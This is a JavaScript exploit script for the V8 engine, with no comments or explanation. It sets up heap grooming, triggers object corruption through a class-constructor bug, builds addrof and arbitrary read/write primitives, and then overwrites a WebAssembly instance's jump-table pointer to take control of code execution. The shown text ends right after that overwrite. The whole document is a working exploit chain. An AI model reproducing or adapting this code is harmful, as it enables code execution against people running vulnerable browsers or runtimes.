let empty_object = {};
let empty_array = [];
let corrupted_instance = null;
let dogc_flag = false;
let buffer = new ArrayBuffer(8);
let f64 = new Float64Array(buffer);
let u32 = new Uint32Array(buffer);
function hex(val){
    return "0x"+val.toString(16);
}


function dogc() {
        if(dogc_flag == true) {
                for(let i = 0 ; i < 900; i++){
                        new ArrayBuffer(0x10000);
                        }
                }
        }

class ClassParent {}
class ClassBug extends ClassParent {
        constructor(a20, a21, a22) {
                const v24 = new new.target();
                let x = [empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object, empty_object];
                super();
                let a = [1.1];
                this.x = x;
                this.a = a;
                JSON.stringify(empty_array);
        }
        [1] = dogc();
}

for (let i = 0; i<200; i++) {
        dogc_flag = false;
        if (i%2 == 0) dogc_flag = true;
        dogc();
}

for (let i = 0; i < 650; i++) {
        dogc_flag=false;
        if (i == 644 || i == 645 || i == 646 || i ==640) {
                dogc_flag=true;
                dogc();
                dogc_flag=false;
        }
        if (i == 646) dogc_flag=true;
        let x = Reflect.construct(ClassBug, empty_array, ClassParent);
        if (i == 646) {
                corrupted_instance = x;
        }
}

let x = corrupted_instance.x;
let a = corrupted_instance.a;
// console.log(x);
// console.log(a);
let rwarr = [1.1, 2.2, 2.2];
dogc_flag = true;
dogc();

function addrof_tmp(obj) {
        x[0] = obj;
        f64[0] = a[0];
        return u32[0];
}

let addr_a = addrof_tmp(a);
let addr_rwarr = addrof_tmp(rwarr);
console.log("[+] addr_a: 0x" + addr_a.toString(16));
console.log("[+] addr_rwarr: 0x" + addr_rwarr.toString(16));

x[5] = 0x10000;
if (a.length != 0x10000) {
        console.error("Initial Corruption Failed!");
}

if (addr_rwarr < addr_a) {
        console.error("Failed");
}

let offset = (addr_rwarr - addr_a) + 0x8;
console.log("[+] offset: " + offset);
if ( (offset % 8) != 0 ) {
        offset += 4;
}

offset = offset / 8;
offset += 1;
offset -= 1;
let marker42_idx = offset;

let b64 = new BigUint64Array(buffer);
let zero = 0n;

function v8h_write64(where, what) {

        b64[0] = zero;
        f64[0] = a[marker42_idx];
        if (u32[1] == 0x6) {
                u32[0] = where-8;
                a[marker42_idx] = f64[0];
        }
        else {
                u32[1] = where-8;
                a[marker42_idx] = f64[0];
        }
        rwarr[0] = what;
}

let changer = [1.1,2.2,3.3,4.4,5.5,6.6]
let leaker  = [1.1,2.2,3.3,4.4,5.5,6.6]
let holder  = {p1: 0x1234, p2: 0x1234, p3: 0x1234};

let changer_addr = addrof_tmp(changer);
let leaker_addr = addrof_tmp(leaker);
let holder_addr = addrof_tmp(holder);

u32[0] = holder_addr;
u32[1] = 0xc;
let original_leaker_bytes = f64[0];

u32[0] = leaker_addr;
u32[1] = 0xc;

v8h_write64(changer_addr+0x8, f64[0]);
v8h_write64(leaker_addr+0x8, original_leaker_bytes);

x.length = 0;
a.length = 0;
rwarr.length = 0;
function chunkToBigIntLE(chunk) {
  let v = 0n;
  for (let i = 0; i < chunk.length; i++) {
    v |= (BigInt(chunk[i]) << BigInt(8 * i));
  }
  return v;
}
function f2i(f) {
        f64[0] = f;
        return BigInt(u32[0]) + (BigInt(u32[1]) << 32n);
}

function i2f(i) {
    u32[0] = Number(i & 0xFFFFFFFFn);
    u32[1] = Number(i >> 32n);
    return f64[0];
}
function v8h_read64(addr) {
        original_leaker_bytes = changer[0];
        u32[0] = Number(addr)-8;
        u32[1] = 0xc;
        changer[0] = f64[0];

        let ret = leaker[0];
        changer[0] = original_leaker_bytes;
        return f2i(ret);
}

function v8h_write(addr, value) {
        original_leaker_bytes = changer[0];
        u32[0] = Number(addr)-8;
        u32[1] = 0xc;
        changer[0] = f64[0];

        f64[0] = leaker[0];
        u32[0] = Number(value);
        leaker[0] = f64[0];
        changer[0] = original_leaker_bytes;
}

function addrof(obj) {
        holder.p2 = obj;
        let ret = leaker[1];
        holder.p2 = 0;
        return f2i(ret) & 0xffffffffn;
}

let buffer_2 = new ArrayBuffer(8);
let f64_2 = new Float64Array(buffer_2);
let u32_2 = new Uint32Array(buffer_2);
let b64_2 = new BigUint64Array(buffer_2);

function wasm_write(addr, value) {
        original_leaker_bytes = changer[0];
        u32_2[0] = Number(addr)-8;
        u32_2[1] = 0xc;
        changer[0] = f64_2[0];

        b64_2[0] = value;
        leaker[0] = f64_2[0];
        changer[0] = original_leaker_bytes;
}

const JUMP_TABLE_START_OFFSET = 0x50n;

var rw_instance = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array([
0,97,115,109,1,0,0,0,1,7,1,96,2,126,126,1,
126,3,2,1,0,7,5,1,1,102,0,0,10,14,1,12,
0,66,144,161,194,132,137,169,162,136,67,11])));

let jump_table_start_slot = addrof(rw_instance) + JUMP_TABLE_START_OFFSET;
let jump_table_start = v8h_read64(jump_table_start_slot);
let f = rw_instance.exports.f;
wasm_write(jump_table_start_slot, jump_table_start + 0x721n);
